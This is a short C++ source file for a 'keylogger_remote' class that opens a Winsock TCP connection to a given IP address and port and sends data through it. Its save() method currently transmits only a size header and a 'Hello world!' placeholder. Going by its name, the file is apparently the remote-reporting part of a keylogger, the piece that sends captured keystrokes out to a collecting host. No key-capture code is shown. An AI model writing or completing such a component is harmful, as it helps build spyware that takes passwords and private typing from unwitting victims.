#include "./keylogger_remote.hpp"

keylogger_remote::keylogger_remote()
{
	a_socket = 0;
}

keylogger_remote::~keylogger_remote()
{
	closesocket(a_socket);

	WSACleanup();
}

void keylogger_remote::initialize(string p_ip_address, int p_port)
{
	WSADATA t_wsa_data;

	int t_result = 0;

	t_result = WSAStartup(MAKEWORD(2,0), &t_wsa_data);

	cout << "WSAStartup" << endl;

	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		exit(EXIT_FAILURE);
	}

	SOCKADDR_IN t_sockaddr_in;
	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str()); //inet_addr(p_ip_address);
	t_sockaddr_in.sin_family      = AF_INET;
	t_sockaddr_in.sin_port		  = htons(p_port);

	a_socket = socket(AF_INET,SOCK_STREAM,0);

	cout << "socket" << endl;

	if(a_socket == INVALID_SOCKET)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));

	cout << "connect" << endl;

	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(EXIT_FAILURE);
	}
}

void keylogger_remote::save()
{
	cout << "Send" << endl;

	int t_size = 4;

	send(a_socket, (char*) &t_size, sizeof(int), 0);

	send(a_socket, "Hello world!\r\n", 14, 0);
}
